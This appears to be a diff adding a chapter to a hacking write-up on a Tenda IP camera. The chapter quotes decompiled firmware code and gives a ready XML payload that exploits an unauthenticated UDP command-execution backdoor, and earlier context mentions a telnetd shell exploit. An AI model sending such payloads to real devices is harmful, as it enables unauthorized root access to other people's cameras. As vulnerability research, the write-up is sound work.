@@ -167,3 +167,45 @@ This command starts to listen on port 8888, providing access to a shell.
 When the exploit is executed, it sends the payload, and the camera runs the telnetd command. Finally, we can connect from our host to port 8888 on the camera to gain shell access. Bingo!
 
 <img src="./assets/images/Pasted image 20250502211253.png">
+
+## Chapter 7: another backdoor 
+
+While researching this camera, I came across a scientific paper(link: https://arxiv.org/html/2406.15103v2) by Italian students who analyzed the behavior of this camera and looked for vulnerabilities. One of the parts of this work particularly interested me:
+
+```
+The latter command (YGMP_CMD), however, is far more interesting in the scope of our work, as it allows unauthenticated remote code execution on the camera by sending a formatted XML payload. In particular, the payload accepts 3 different tags for parsing: TARGET, MAC, and CMD. Although the content of both TARGET and MAC are apparently not used except in some printing functions, the content of the CMD tag is compared to the reboot string. If the strcmp returns 0, the FUN_00016ea8 function is called with the argument /app/bin/cmd reset; otherwise, the content of the CMD tag is passed directly to the same function.
+```
+
+In brief: One of the camera's programs creates a UDP socket, binds it to a specific port, and receives various user commands through this port. By sending a specific payload to this port, a remote code execution attack can be performed, as the program does not verify which CMD is received.
+
+
+This is how it looks like "under the hood":
+
+```
+input_cmd_checker(acStack_828,&DAT_00029cc8,&local_c3c,0x400);
+if (((char)local_c3c == '\0') || (iVar4 = strcmp((char *)&local_c3c,acStack_e1c), iVar4 == 0)) {
+    input_cmd_checker(acStack_828,&DAT_00029c9c,&local_c3c,0x400);
+    /* [BAD 2] fprintf */
+    fprintf(stderr,"cmd<%s>\n",&local_c3c);
+    iVar4 = strcmp((char *)&local_c3c,"reboot");
+    if ((iVar4 == 0) && (iVar4 = FUN_0001b040("/app/bin/cmd"), iVar4 != 0)) {
+        func_with_system("/app/bin/cmd reset");
+    }
+    func_with_system(&local_c3c);
+}
+```
+
+As can be seen in the last few lines, if the command we sent is "reboot," the program will restart the camera, but if it's not... the program will simply execute that command. Isn't this a backdoor? Ahem. We connect to this port, send a payload with "malicious code":
+
+```
+<YGMP_CMD><TARGET>ip_was_here</TARGET><MAC>10:20:30:40:50:60</MAC><CMD>echo pwned_by_cr0cus > /dev/kmsg </CMD></YGMP_CMD>
+```
+
+Where echo pwned_by_cr0cus > /dev/kmsg is our malicious payload that leaves a trace in the kernel's ring buffer. The result is shown in the screenshot.
+In fact, the developers left the last line so that any arbitrary code could be executed on the camera. In other words, this vulnerability allows you to easily gain root access.
+
+
+## Outro
+
+This is how Tenda was hacked. Thanks for the attention and g00d luck!
+
